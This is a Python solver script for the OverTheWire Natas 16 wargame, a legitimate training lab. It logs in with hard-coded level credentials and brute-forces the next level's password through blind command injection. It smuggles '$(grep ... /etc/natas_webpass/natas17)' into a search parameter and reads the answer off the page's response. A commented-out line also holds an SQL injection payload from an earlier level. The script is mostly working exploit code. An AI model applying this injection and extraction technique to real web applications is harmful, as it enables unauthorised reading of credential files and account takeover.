import os
import urllib.request as url
import urllib.parse
import string

NATAS_URL = 'http://natas16.natas.labs.overthewire.org'
NATAS_USERNAME = 'natas16'
NATAS_PWD = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
PASSWORD_LENGTH = 33
HOSTAGE_WORD = 'filtering'


def isCorrectInput(string):
    '''
    Determines if the string returns "This user exists" or not

        Parameters:
            string : The input to the form
            
        Returns:
            True if the output is "This user exists". False otherwise
    '''
    # request = urllib.parse.urlencode({'username': f'natas16" and password like BINARY "{string}'})
    # request = request.encode('ascii')

    # post_request = url.Request(NATAS_URL, request)
    # output = url.urlopen(post_request)

    # html_page = output.read().decode()

    # containsString = html_page.find(FOUND_STRING) != -1
    # return containsString

    parameters = urllib.parse.urlencode({'needle': f'$(grep {string} /etc/natas_webpass/natas17){HOSTAGE_WORD}', 'submit': 'search'})
    output = url.urlopen(NATAS_URL + '/?' + parameters)
    html_page = output.read().decode()
    return html_page.find(HOSTAGE_WORD) == -1


def next_char(password='', password_letters=string.ascii_letters+string.digits):
    for char in password_letters:
        if isCorrectInput('^' + password + char):
            return password + char


if __name__ == "__main__":

    ## =======================================================================================
    ## FETCH PAGE
    ## ----------
    ## This part works. I am able to reach the form page.
    ## =======================================================================================

    auth_handler = url.HTTPBasicAuthHandler()
    auth_handler.add_password('Authentication required', NATAS_URL, NATAS_USERNAME, NATAS_PWD)

    opener = url.build_opener(auth_handler)
    url.install_opener(opener)

    output = url.urlopen(NATAS_URL)

    ## =======================================================================================
    ## This part creates a list of letters that are in the password. I commented it out 
    ## because it takes some time to run so I want to avoid running it too often
    ## =======================================================================================

    # alphanum = string.ascii_letters + string.digits

    # password_letters = list()

    # for alnum in alphanum:
    #     if isCorrectInput(alnum):
    #         password_letters.append(alnum)

    # print(password_letters)

    ## =======================================================================================
    ## BRUTEFORCE
    ## ----------
    ## This is where the fun begins. I am going to bruteforce the password using the password_letters
    ## list that I have generated
    ## =======================================================================================

    password_letters = ['b', 'c', 'd', 'g', 'h', 'k', 'm', 'n', 'q', 'r', 's', 'w', 'A', 'G', 'H', 'N', 'P', 'Q', 'S', 'W', '0', '3', '5', '7', '8', '9']
    password = ''
    for i in range(PASSWORD_LENGTH - 1):
        password = next_char(password, password_letters)
        print(password)
    print('Bruteforce end')
